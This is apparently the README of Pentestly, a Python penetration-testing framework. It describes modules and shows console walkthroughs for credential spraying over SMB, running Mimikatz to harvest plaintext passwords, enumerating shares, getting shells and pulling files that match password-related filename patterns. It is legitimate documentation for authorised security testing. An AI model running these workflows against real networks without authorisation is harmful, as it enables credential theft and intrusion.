# Pentestly

Pentestly is a combination of expanding Python tools for use in penetration tests. The goal is to utilize a familiar user interface while making contributions to the framework easy with the power of Python.

Blog post: [Pentestly Framework: When Pentesting Meets Python and Powershell](https://www.praetorian.com/blog/pentestly-framework-when-pentesting-meets-python-and-powershell)

Author: [@ctfhacker](https://twitter.com/ctfhacker) / Cory Duplantis

# Demo

[![asciicast](https://asciinema.org/a/3grjnat1nrs7lvti5kdjhcg9h.png)](https://asciinema.org/a/3grjnat1nrs7lvti5kdjhcg9h)

# Current features

* Import NMAP XML
* Test SMB authentication using:
    - individual credentials
    - file containing credentials
    - null credentials
    - NTLM hash
* Test local administrator privileges for successful SMB authentication
* Identify readable SMB shares for valid credentials
* Store Domain/Enterprise Admin account names
* Determine location of running Domain Admin processes
* Determine systems of logged in Domain Admins
* Execute Powershell commands in memory and exfil results
* Execute Mimikatz to gather plaintext password from memory ([Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikat://github.com/PowerShellMafia/PowerSploit))
* Receive a command shell ([Powercat](https://github.com/besimorhino/powercat))
* Receive a meterpreter session ([Invoke-Shellcode.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1))

# Shoulders of Giants

Pentestly stands on the shoulders of giants. Below are the current tools utilized in Pentestly:

* [recon-ng](https://bitbucket.org/LaNMaSteR53/recon-ng) - Backend database for recon-ng is beautifully made and leveraged in Pentestly for data manipulation
* [wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py) - Allows us to execute Powershell commands quickly and easily via WMI
* [smbmap.py](https://github.com/ShawnDEvans/smbmap) - Useful utility for enumerating SMB shares
* [Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1) - Implementation of Mimikatz in Powershell
* [powercat.ps1](https://github.com/besimorhino/powercat) - Netcat-esque functionality in Powershell
* [Invoke-Shellcode.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1) - Deploy Meterpreter in Powershell

* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Source of inspiration for the simple Mimikatz server in Pentestly

# Install
```
git clone https://github.com/praetorian-inc/pentestly.git
./install.sh
./pentestly
```

# Usage

Let's walk through several functions currently implemented.

## Change workspace
```
[pentestly][default] > workspaces list

  +------------+
  | Workspaces |
  +------------+
  | default    |
  +------------+

[pentestly][default] > workspaces add project
[pentestly][project] > workspaces select project
```

## Load from nmap
```
[pentestly][project][nmap_xml] > load nmap
[pentestly][project][nmap_xml] > set filename /root/PROJECT/full-all-alive.xml
FILENAME => /root/PROJECT/full-all-alive.xml
[pentestly][project][nmap_xml] > show options

  Name      Current Value                      Required  Description
  --------  -------------                      --------  -----------
  FILENAME  /root/PROJECT/full-all-alive.xml  yes       Path and filename for nmap XML input

[pentestly][project][nmap_xml] > run
```

## Test logins
Use file with creds to test login
```
[pentestly][project][login] > cat /tmp/creds
[*] Command: cat /tmp/creds
user1 pass1
user2 pass2
[pentestly][project][login] > load login
[pentestly][project][login] > set userpass_file /tmp/creds
USERPASS_FILE => /tmp/creds
[pentestly][project][login] > set username ''
USERNAME => ''
[pentestly][project][login] > set password ''
PASSWORD => ''
[pentestly][project][login] > run
```

Use single username password
```
[pentestly][project][login] > load login
[pentestly][project][login] > set username admin
USERNAME => admin
[pentestly][project][login] > set password password
PASSWORD => password
[pentestly][project][login] > set userpass_file ''
USERPASS_FILE => ''
[pentestly][project][login] > run
```

Use credentials over a small subset of IPs
i.e. over the 192.168.8.0/24 found in the table
```
[pentestly][project][login] > load login
[pentestly][project][login] > set username admin
USERNAME => admin
[pentestly][project][login] > set password password
PASSWORD => password
[pentestly][project][login] > set userpass_file ''
USERPASS_FILE => ''
[pentestly][project][login] > run
[pentestly][project][login] > set source query select * from pentestly_creds where host like '192.168.8.%'
```

## Gather Domain and Enterprise admins
```
[pentestly][project][login] > load get_domain # Notice fuzzy searching - get_domain finds get_domain_admin_names
[pentestly][project][get_domain_admin_names] > show options

  Name    Current Value  Required  Description
  ------  -------------  --------  -----------
  SOURCE  default        yes       source of input (see 'show info' for details)

[pentestly][project][get_domain_admin_names] > run
[*] Found Domain Admin: domain\admin1
[*] Found Domain Admin: domain\admin2
```

## Run mimikatz over IPs with executable rights
```
[pentestly][default][get_domain_admin_names] > load mimi
[pentestly][default][mimikatz] > run
Select local interface for hosting scripts

0. 127.0.0.1
1. 10.220.8.94
2. 172.27.67.14
> 1

[*] Execution creds: domain\Admin:adminpassword@192.168.1.1
[*] Success! Admin.DA:p@$$w0rd  - DOMAIN ADMIN!
```

## Show local admins
```
[pentestly][default][show_local_admins] > load show_local_admins
[pentestly][default][show_local_admins] > run

+---------------------------------------------------------------------------------------------------------------+
|      host      | access |  username  |  password  | domain | process | logged_in | success | execute | module |
+---------------------------------------------------------------------------------------------------------------+
| 10.202.208.112 |        | nsportsman | password1! | zojix  |         |           | True    | True    | login  |
+---------------------------------------------------------------------------------------------------------------+
```

## Show domain admins
```
[pentestly][default][show_domain_admins] > load show_domain_admins
[pentestly][default][show_domain_admins] > run

+--------------------------------------------------------------------------------------------------------------------------+
|      host      | access        | username  |  password       | domain | process | logged_in | success | execute | module |
+--------------------------------------------------------------------------------------------------------------------------+
| 10.202.208.112 | Domain Admin  | TheRealDA | </l33TPassword> | zojix  |         |           | True    | True    | login  |
+--------------------------------------------------------------------------------------------------------------------------+
```

## Enumshares

```
[pentestly][default] > load enums
[pentestly][default][enumshares] > run
[*] Execution creds: workgroup\Administrator:BadAdminPassword@192.168.224.252
defaultdict(<type 'list'>, {'readonly': [u'ADMIN$', u'C', u'C$', u'Users'], 'noaccess': [u'IPC$']})
```

## Show new shares

```
[pentestly][default][interesting_files] > show pentestly_shares

+------------------------------------------------------------------------------------------------+
| rowid |       host      |    username   | readwrite |      readonly     | noaccess |   module   |
+-------------------------------------------------------------------------------------------------+
| 1     | 192.168.224.252 | Administrator |           | ADMIN$,C,C$,Users | IPC$     | enumshares |
+-------------------------------------------------------------------------------------------------+
```

## Find/Download interesting files

```
[pentestly][default][interesting_files] > show options

    Name     Current Value                                                                                                                              Required  Description
    -------  -------------                                                                                                                              --------  -----------
    PATTERN  (Groups.xml|Services.xml|Printers.xml|Drives.xml|DataSources.xml|ScheduledTasks.xml|unattend|important|passw|backup|setup).*[^dll][^exe]$  yes       Regex pattern to look for in filenames
    SOURCE   default                                                                                                                                    yes       source of input (see 'show info' for details)
```

Can change the `pattern` to something a bit more specialized

```
[pentestly][default][interesting_files] > set pattern important.txt|super_secret
PATTERN => important.txt|super_secret
[pentestly][default][interesting_files] > show options

    Name     Current Value               Required  Description
    -------  -------------               --------  -----------
    PATTERN  important.txt|super_secret  yes       Regex pattern to look for in filenames
    SOURCE   default                     yes       source of input (see 'show info' for details)
```

Execute and download found files

```
[pentestly][default][interesting_files] > run
[*] Administrator
[*] Execution creds: workgroup\Administrator:BadAdminPassword@192.168.224.252
[+] Match found! Downloading: Users\Administrator\Desktop\important.txt.txt
192.168.224.252-Users_Administrator_Desktop_important.txt.txt
[+] Match found! Downloading: Users\Administrator\Desktop\super_secret.txt
192.168.224.252-Users_Administrator_Desktop_super_secret.txt
```

# Contributing

Creating new modules is easy in Pentestly. Begin with the code provided in `skeleton.py`:

```
from libs.pentestlymodule import PentestlyModule

class Module(PentestlyModule):

    meta = {
        'name': 'Your module name goes here',
        'author': 'Developer name goes here',
        'description': 'Description of the module goes here',
        'query': 'SQL QUERY whose result is passed to your module',
        'options': (
            ('Option1', 'Default Value', Required-True/False, 'Description of option'),
        ),
    }

    def module_pre(self):
        # Optional
        # Happens before your module

    def module_run(self, data):
        # Required
        # data is the result from the SQL query set in the options
        
        ### Few magic functions
        # self.query - Perform an SQL query on the internal database
        results = self.query("select * from pentestly_creds")
        
        # self.output - print default information to the user
        self.output("Performed an SQL query")
        self.output(results)

        # self.alert - print successful message to the user
        self.success("Yay! We performed successful work")

    def module_post(self):
        # Optional
        # Happens after your module
```

The key points here are to fill the `meta` dict with the corresponding information as well as the `module_run` function for module functionality.

This script is then placed in the `modules/` folder or in your personal `~/.pentestly/modules` folder for portability.

Stay tuned for a detailed example script explanation in the coming weeks.

# TODO
* Implement `secretsdump.py` module
* Add utility functions for database queries similar to `creds`, `services`
* Rework draw_table function to have fixed width columns
* Import credentials from [Gladius](https://github.com/praetorian-inc/gladius)
* Implement GPP password search and decrypt module
* Look into utilizing Invoke-Shellcode

# Changelog

0.1.0 (2016-02-18)
------------------
Initial release
